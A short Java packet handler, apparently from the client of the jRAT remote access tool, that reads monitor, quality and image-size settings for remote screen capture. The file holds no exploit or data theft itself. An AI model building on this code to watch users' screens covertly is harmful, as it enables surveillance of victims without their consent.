package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Screen;

public class Packet50UpdateRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int monitor = con.readInt();
		int quality = con.readInt();
		int size = con.readInt();
		
		if (Screen.instance != null) {
			Screen.instance.setMonitor(monitor);
			Screen.instance.setQuality(quality);
			Screen.instance.setImageSize(size);
		}
	}

}
